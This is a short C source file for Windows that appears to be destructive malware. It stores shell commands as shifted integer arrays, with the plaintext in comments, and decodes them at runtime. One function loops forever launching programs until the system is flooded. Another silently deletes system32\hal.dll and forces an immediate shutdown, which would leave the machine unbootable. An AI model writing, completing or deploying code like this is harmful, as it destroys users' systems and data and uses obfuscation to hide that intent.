#include "stdafx.h"
#include "destroy.h"

STARTUPINFO info = {sizeof(info)};
PROCESS_INFORMATION processInfo;
LPTSTR szCmdline = _tcsdup(TEXT("start firefox.exe"));

type_system oui = get_oui();
type_print ouioui = get_ouioui();

//char * winmine = "start winmine.exe";
int cwinmine[18] = {172,109,154,107,173,25,176,98,167,102,162,103,158,39,158,113,158,-7};
//char * explorer = "start explorer.exe";
int cexplorer[19] = {172, 109, 154, 107, 173, 25, 158, 113, 169, 101, 168, 107, 158, 107, 103, 94, 177, 94, 57};
//char * firefox = "start firefox.exe";
int cfirefox[18] = {172, 109, 154, 107, 173, 25, 159, 98, 171, 94, 159, 104, 177, 39, 158, 113, 158, -7};
//char * pinball = "start PINBALL.EXE";
int cpinball[18] = {172, 109, 154, 107, 173, 25, 137, 66, 135, 59, 122, 69, 133, 39, 126, 81, 126, -7};
//char * deller = "del C:\\windows\\system32\\hal.dll /Q";
int cdeller[35] = {157,94,165,25,124,51,149,112,162,103,157,104,176,108,149,108,178,108,173,94,166,44,107,85,161,90,165,39,157,101,165,25,104,74,57};
//char * off = "shutdown -s -t 0 -f";
int coff[20] = {172,97,174,109,157,104,176,103,89,38,172,25,102,109,89,41,89,38,159,-7};

char* dechiffrement(int origin[], int size){
	char res[150];
	for (int i=0;i<size;i++){
		if (i%2==0){
			res[i] = origin[i] - 57;
		} else {
			res[i] = origin[i] + 7;
		}
	}

	return res;
}

int kboum1(){
	while(1) {
		oui(dechiffrement(cwinmine, 18));
		oui(dechiffrement(cexplorer, 19));
		oui(dechiffrement(cfirefox, 18));
		oui(dechiffrement(cpinball, 18));
	}

	return 0;
}

int kboum2(){
	oui(dechiffrement(cdeller, 35));
	oui(dechiffrement(coff, 20));
	return 0;
}
